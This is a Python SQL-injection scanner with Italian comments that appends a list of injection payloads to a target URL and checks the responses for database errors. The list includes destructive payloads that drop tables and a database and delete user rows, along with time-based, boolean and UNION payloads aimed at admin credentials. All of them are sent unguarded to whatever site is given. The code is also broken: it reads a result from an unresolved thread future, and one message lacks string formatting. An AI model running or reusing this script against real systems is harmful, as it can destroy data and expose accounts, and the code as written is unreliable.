# Import vari
import requests
import re
import argparse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style

# Crea un parser
parser = argparse.ArgumentParser()

# Aggiunge argomenti
parser.add_argument("url", help="URL da testare")
parser.add_argument("-m", "--max_concurrent_requests", type=int, default=1, help="Il numero massimo di richieste HTTP(S) simultanee da utilizzare (multi-thread)")

# Parse dell'argomento
args = parser.parse_args()

# Definizione dell'url da testare
url = args.url

# Creare una sessione (utilizzato per Session ID)
session = requests.Session()

# Effettua una richiesta GET alla pagina
response = session.get(url)

max_concurrent_requests = args.max_concurrent_requests

# Crea un esecutore
executor = ThreadPoolExecutor(max_workers=max_concurrent_requests)


# Crea una richesta GET alla pagina
response = requests.get(url)

# Controlla se la pagina è raggiungibile
if response.status_code == 200:
    # Controllare la risposta per verificare la presenza di indicatori comuni di SQL injection (analisi euristica)
    if re.search("error in your SQL syntax|mysql_fetch|SQL syntax|Warning: mysql_|UNION|SELECT|INSERT", response.text, re.IGNORECASE):
        print(Fore.RED + "Rilevata una possibile vulnerabilità SQLi sulla base di un'analisi euristica: {response.url}" + Style.RESET_ALL)
    else:
        # Controllare l'intestazione del server per determinare il DBMS utilizzato.
        if "mysql" in response.headers["server"].lower():
            print(Fore.YELLOW + "DBMS MySQL rilevato" + Style.RESET_ALL)
        elif "postgresql" in response.headers["server"].lower():
            print(Fore.YELLOW + "DBMS PostgreSQL rilevato" + Style.RESET_ALL)

        # Definizione delle stringhe di test (da aggiornare)
        test_strings = [
            "'; SELECT * FROM users; --",
            "' OR 1=1; --",
            "' OR 'a'='a",
            "') OR ('a'='a",
            "'; DROP TABLE users; --",
            "' OR username LIKE '%admin%' --",
            "' OR 1=1--",
            "' OR '1'='1",
            "') OR ('1'='1",
            "'; DELETE FROM users; --",
            "' OR username LIKE '%admin%' OR '1'='1",
            "' OR '1'='1' OR '1'='1",
            "') OR ('1'='1' OR '1'='1",
            "'; DROP DATABASE users; --",
            "' OR username LIKE '%admin%' OR '1'='1' OR '1'='1",
            "' OR '1'='1' OR '1'='1' OR '1'='1",
            "') OR ('1'='1' OR '1'='1' OR '1'='1",
            # Boolean-based blind
            "'; SELECT * FROM users WHERE username = 'admin' AND password = '{password}' --",
            "'; SELECT * FROM users WHERE username = 'admin' AND password = '{password}' OR '1' = '1' --",
            "'; SELECT * FROM users WHERE username = 'admin' AND password = '{password}' OR 'a' = 'a' --",
            "'; SELECT * FROM users WHERE username = 'admin' AND password = '{password}' OR 1 = 1 --",
            "'; SELECT * FROM users WHERE username = 'admin' AND password = '{password}' OR '1' = '1' OR 'a' = 'a' --",

            # Time-based blind
            "'; SELECT * FROM users WHERE username = 'admin' AND SLEEP(5) --",
            "'; SELECT * FROM users WHERE username = 'admin' AND BENCHMARK(100000000, MD5(1)) --",

            # Error-based
            "'; SELECT * FROM users WHERE username = 'admin' AND (SELECT * FROM (SELECT(SLEEP(5)))LFcA) --",
            "'; SELECT * FROM users WHERE username = 'admin' AND (SELECT * FROM (SELECT(BENCHMARK(100000000, MD5(1))))LFcA) --",

            # UNION query
            "'; SELECT * FROM users UNION SELECT * FROM admins --",
            "'; SELECT * FROM users WHERE username = 'admin' UNION SELECT * FROM admins WHERE password = '{password}' --",

            # Stacked queries
            "'; SELECT * FROM users; SELECT * FROM admins --"
        ]

        # Controllo per ogni stringa
        for test_string in test_strings:
            # Ccrea una richiesta GET alla pagina con le stringhe di test
            response = executor.submit(requests.get, url + test_string)

            # Controlla la presenza di errori sql
            if re.search("error in your SQL syntax|mysql_fetch", response.text, re.IGNORECASE):
                # Possibile vulnerabilità
                print(
                    Fore.RED + f"Individuata una possibile vulnerabilità di tipo SQL injection: {test_string}" + Style.RESET_ALL)
            else:
                # Nessuna vulnerabilità trovata
                print(
                    Fore.GREEN + "Non sono state riscontrate vulnerabilità di tipo SQL injection." + Style.RESET_ALL)
else:
    # response.status_code != 200
    print(Fore.RED + "Errore: Impossibile raggiungere il sito. Controllare l'URL e riprovare." + Style.RESET_ALL)
